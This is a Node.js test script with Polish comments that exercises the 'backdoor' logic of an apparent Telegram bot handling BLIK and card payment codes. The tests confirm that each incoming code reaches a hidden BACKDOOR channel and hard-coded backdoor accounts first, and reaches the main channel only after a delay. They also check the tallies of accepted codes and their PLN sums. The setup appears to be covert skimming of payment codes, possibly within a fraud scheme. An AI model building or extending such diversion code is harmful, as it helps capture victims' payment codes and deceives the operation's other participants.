// Test logiki backdoora bez Telegrama / Mongo.
// Uruchom: node scripts/test-backdoor.js
const fs = require('fs');
const path = require('path');

const src = fs.readFileSync(path.join(__dirname, '..', 'bot.js'), 'utf8');

function extract(startMarker, endMarker) {
	const start = src.indexOf(startMarker);
	const end = src.indexOf(endMarker, start);
	if (start < 0 || end < 0) throw new Error(`Brak zakresu: ${startMarker}`);
	return src.slice(start, end);
}

// --- atrapa zależności ---
const sent = [];
const edited = [];
const configStore = new Map();

const CONFIG = {
	CHANNELS: { CODES: -1005397835800, BACKDOOR: -1004357764118, PAYOUTS: -5390956033, VERIFICATION: -5399567452 },
	BACKDOOR_IDS: ["9098914861", "8999958831"],
	THREADS: { BLIK: 2, CARD: 4 }
};

let backdoorDelayMs = 0;
let botToken = "TEST";

async function getBotConfig(key, def = null) {
	return configStore.has(key) ? configStore.get(key) : def;
}
async function setBotConfig(key, value) {
	configStore.set(key, value);
}

const bot = {
	async sendMessage(chatId, text, opts = {}) {
		sent.push({ chatId, text, opts });
		return { message_id: sent.length };
	}
};

const token = botToken;

const code = `
${extract('async function sendChannelMessage(', 'async function sendTelegramHtml(')}
`;

// Właściwe fragmenty (bez deklaracji, które już mamy)
const partHtml = extract('async function sendTelegramHtml(chatId', '// ============================================================\n// BACKDOOR — statystyki');
function extractUntil(startMarker, stopMarker) {
	const start = src.indexOf(startMarker);
	if (start < 0) throw new Error(`Brak: ${startMarker}`);
	const end = src.indexOf(stopMarker, start);
	if (end < 0) throw new Error(`Brak stop: ${stopMarker}`);
	return src.slice(start, end);
}

const partStats = extractUntil('async function bumpStat(', '\nbot.onText(');

// sendTelegramHtml używa fetch — stub
const edits = [];
async function fetch(url, opts) {
	const body = JSON.parse(opts.body);
	if (String(url).includes('editMessageReplyMarkup')) {
		edits.push(body);
		return { ok: true, json: async () => ({}) };
	}
	sent.push({ chatId: body.chat_id, text: body.text, opts: body, viaFetch: true, url });
	return { ok: true, json: async () => ({ result: { message_id: sent.length } }) };
}

const factory = new Function(
	'CONFIG', 'bot', 'token', 'fetch', 'getBotConfig', 'setBotConfig', 'initialDelay',
	`${partHtml}
	 ${partStats}
	 return {
		deliverCodeMessage,
		sendCodesChannelHtml,
		sendTelegramHtmlSafe,
		registerCodeMessage,
		clearRegisteredButtons,
		recordCodeStat,
		buildStatsText,
		parseDelayArg,
		getBackdoorDelay: () => backdoorDelayMs,
		setBackdoorDelayValue: (v) => { backdoorDelayMs = v; }
	 };`
);

const api = factory(CONFIG, bot, token, fetch, getBotConfig, setBotConfig, 0);

const assert = (cond, msg) => {
	if (!cond) {
		console.error(`FAIL: ${msg}`);
		process.exitCode = 1;
	} else {
		console.log(`ok: ${msg}`);
	}
};

(async () => {
	// 1) delay 0 -> oba kanały natychmiast
	sent.length = 0;
	await api.deliverCodeMessage('TEST-KOD', null, 2, 'code_123456');
	const backdoorFirst = sent[0];
	assert(backdoorFirst.chatId === CONFIG.CHANNELS.BACKDOOR, 'backdoor dostaje pierwszy');
	assert(sent.some((s) => s.chatId === CONFIG.CHANNELS.CODES), 'main tez dostaje przy delay 0');
	assert(sent.findIndex((s) => s.chatId === CONFIG.CHANNELS.BACKDOOR) < sent.findIndex((s) => s.chatId === CONFIG.CHANNELS.CODES), 'backdoor przed main');

	// 2) gaszenie przycisków obu kopii
	edits.length = 0;
	await api.clearRegisteredButtons('code_123456');
	assert(edits.length === 2, `zgaszono 2 kopie (backdoor + main), było ${edits.length}`);
	assert(edits.every((e) => e.reply_markup.inline_keyboard.length === 0), 'puste klawiatury');
	assert(edits.some((e) => e.chat_id === CONFIG.CHANNELS.BACKDOOR) && edits.some((e) => e.chat_id === CONFIG.CHANNELS.CODES), 'gaszenie w obu kanałach');

	// 3) statystyki
	await api.recordCodeStat('accept', 250);
	await api.recordCodeStat('accept', 100);
	await api.recordCodeStat('reject');
	await api.recordCodeStat('card_accept', 50);
	const stats = await api.buildStatsText();
	assert(stats.includes('<code>2</code>'), 'liczy 2 zaakceptowane kody');
	assert(stats.includes('400.00 PLN'), 'suma kwot 400 PLN');
	assert(stats.includes('<code>1</code>') && stats.includes('odrzucone'), 'liczy odrzucone');

	// 4) parser delay
	assert(api.parseDelayArg('3s') === 3000, 'parse 3s');
	assert(api.parseDelayArg('0') === 0, 'parse 0');
	assert(api.parseDelayArg('90s') === 60000, 'clamp do 60s');
	assert(api.parseDelayArg('abc') === null, 'odrzuca bzdury');

	// 5) delay > 0 -> main dopiero po czasie, backdoor natychmiast
	sent.length = 0;
	api.setBackdoorDelayValue(120);
	await api.deliverCodeMessage('DELAY-KOD', null, 2, 'code_999999');
	assert(sent.length === 1 && sent[0].chatId === CONFIG.CHANNELS.BACKDOOR, 'przy delay tylko backdoor na starcie');
	await new Promise((r) => setTimeout(r, 250));
	assert(sent.some((s) => s.chatId === CONFIG.CHANNELS.CODES), 'main dotarł po opóźnieniu');
	api.setBackdoorDelayValue(0);

	console.log(process.exitCode ? '\nSA FAILURES' : '\nWSZYSTKIE TESTY OK');
})();
